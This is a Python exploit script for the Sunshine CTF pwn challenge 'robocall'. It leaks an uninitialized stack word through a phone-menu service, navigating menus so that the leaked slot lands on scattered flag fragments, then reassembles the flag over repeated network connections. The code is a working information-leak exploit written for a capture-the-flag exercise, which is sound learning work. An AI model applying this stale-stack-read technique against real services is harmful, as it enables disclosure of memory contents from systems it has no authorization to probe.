#!/usr/bin/env python3
"""robocall (Sunshine CTF, pwn 498).

Two facts combine into an arbitrary-stack-word leak:

1. raw_parse_int(buf, out) returns 0 WITHOUT writing `out` when the first non-space
   character is not a digit (0x14c6: `cmp al,'/'; jle -> return 0`).  Callers never
   pre-initialise that word, so it keeps whatever the stack held there before.
2. cancel_plan prints exactly that word (rbp-0x204):  You've entered "<int>", are you sure?

place_flag() reads flag.txt and scatters it into 13 four-byte pieces at
rbp_main - (0x120 + 0x644 + CHUNK_DEPTH[i])   (u32 table at 0x4020), then returns
without printing it.  Every menu edge moves the frame by a fixed amount
(rbp_callee = rbp_caller - (caller_frame + 16)), so *navigating the phone tree* slides
the leaked word across the stack.  analysis/paths.py solves which path lands it on a chunk.

Note the phone tree lies: "to cancel your plan press 2" actually transfers you to an
operator; cancel_plan is reached with 3.
"""
import sys, socket, re, struct, argparse
from collections import deque
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

HOST, PORT = "sunshinectf.games", 26199

FRAME = {
    "start_position": 0x110, "initial_call": 0x170, "report_outage": 0x150,
    "technical_support": 0x160, "other_inquiries": 0x190, "cancel_plan": 0x430,
}
EDGES = {
    "start_position":    [("1", "initial_call"), ("3", "start_position")],
    "initial_call":      [("2", "report_outage"), ("4", "technical_support"), ("6", "other_inquiries")],
    "report_outage":     [("", "start_position")],
    "technical_support": [("1", "report_outage")],
    "other_inquiries":   [("2", "cancel_plan")],
    "cancel_plan":       [("4", "cancel_plan")],
}
SLOT = 0x204
CHUNK_BASE = 0x120 + 0x644
RE_LEAK = re.compile(rb'You\'ve entered "(-?\d+)"')


def chunk_depths(binary):
    return [CHUNK_BASE + v for v in struct.unpack_from("<13I", binary, 0x4020)]


def plan(chunks):
    want = {d: i for i, d in enumerate(chunks)}
    out, seen = {}, {("start_position", 0x120)}
    q = deque([("start_position", 0x120, [])])
    while q and len(out) < len(want):
        fn, depth, path = q.popleft()
        if fn == "cancel_plan" and depth + SLOT in want:
            out.setdefault(want[depth + SLOT], path)
        if depth > 0x2400 or len(path) > 30:
            continue
        for choice, callee in EDGES[fn]:
            nd = depth + FRAME[fn] + 16
            if (callee, nd) not in seen:
                seen.add((callee, nd))
                q.append((callee, nd, path + [(fn, choice)]))
    return out


class Conn:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=12)
        self.buf = b""
        self.log = bytearray()
        self.alive = True

    def pump(self, secs=0.25):
        self.s.settimeout(secs)
        try:
            while True:
                d = self.s.recv(8192)
                if not d:
                    self.alive = False
                    return
                self.buf += d
                self.log += d
        except (socket.timeout, OSError):
            pass

    def until(self, marker, tries=40):
        for _ in range(tries):
            if marker in self.buf:
                i = self.buf.index(marker) + len(marker)
                head, self.buf = self.buf[:i], self.buf[i:]
                return head
            if not self.alive:
                raise RuntimeError(f"dead at {marker!r} tail={bytes(self.log)[-180:]!r}")
            self.pump(0.3)
        raise RuntimeError(f"timeout at {marker!r} tail={bytes(self.log)[-180:]!r}")

    def answer(self, marker, value):
        self.until(marker)
        self.s.sendall(value.encode() + b"\n")
        self.pump(0.2)


MENU_TOP = b"3. Scream in a mix"
MENU_IC = b"To hear these options again"
MENU_OI = b"To speak with an operator press 3."
MENU_TS = b"If you need equipment replaced press 2."
PROMPT_RP = b"Please report the outage address:"
PROMPT_CP = b"Press 8 for yes."
PROMPT_WHY = b"Press 5 to enter your own reason."
LOGIN = [b"Please enter the phone number associated", b"Please enter the address we have on file",
         b"Please enter the name of your first pet"]


def walk(c, path):
    logged = False
    for fn, choice in path:
        if fn == "cancel_plan" and not logged:
            for m in LOGIN:
                c.answer(m, "junk")
            logged = True
        if fn == "start_position":
            c.answer(MENU_TOP, choice)
            if choice == "3":                       # scream asks one more question
                c.answer(b"On a scale of 1 to 10", "5")
        elif fn == "initial_call":
            c.answer(MENU_IC, choice)
        elif fn == "other_inquiries":
            c.answer(MENU_OI, choice)
        elif fn == "technical_support":
            c.answer(MENU_TS, choice)
        elif fn == "report_outage":
            c.answer(PROMPT_RP, "address")
        elif fn == "cancel_plan":
            c.answer(PROMPT_CP, "0")            # q1: not 1 -> keep going
            c.answer(PROMPT_CP, "1")            # q2: 1 -> go to the reasons menu
            c.answer(PROMPT_WHY, "4")           # reason 4: fun fact + cancel_plan()
    if not logged:
        for m in LOGIN:
            c.answer(m, "junk")
    c.answer(PROMPT_CP, "x")                    # q1 non-numeric -> word stays stale
    c.answer(PROMPT_CP, "x")                    # q2 non-numeric -> prints it
    c.until(b"You've entered \"")
    for _ in range(25):
        if b'", are you sure' in bytes(c.log):
            break
        c.pump(0.2)
    hits = RE_LEAK.findall(bytes(c.log))
    if not hits:
        raise RuntimeError("no leak; tail=" + repr(bytes(c.log)[-180:]))
    return struct.pack("<I", int(hits[-1]) & 0xFFFFFFFF)


def grab(path, host, port):
    c = Conn(host, port)
    c.pump(1.0)
    c.until(b"Press enter to start.")
    c.s.sendall(b"42\n")                        # be_annoying = 0 -> no nanosleep delays
    c.pump(0.3)
    try:
        return walk(c, path)
    finally:
        c.s.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=HOST)
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--chunks", default="")
    a = ap.parse_args()

    blob = open("files/robocall", "rb").read()
    chunks = chunk_depths(blob)
    paths = plan(chunks)
    print("reachable chunks:", sorted(paths))
    want = [int(x) for x in a.chunks.split(",")] if a.chunks else sorted(paths)

    got = {}
    for i in want:
        for attempt in range(3):
            try:
                got[i] = grab(paths[i], a.host, a.port)
                print(f"  chunk[{i:2d}] @-0x{chunks[i]:04x} -> {got[i]!r}")
                break
            except Exception as e:
                print(f"  chunk[{i:2d}] attempt {attempt + 1}: {e}")
                sys.stdout.flush()
    data = b"".join(got[i] for i in sorted(got))
    print("\nassembled:", data)
    m = re.search(rb"sun\{[^}]*\}", data)
    if m:
        print("[!] FLAG:", m.group().decode())
        open("flag.txt", "wb").write(m.group() + b"\n")
    else:
        print(f"[x] incomplete ({len(got)}/13)")


if __name__ == "__main__":
    main()
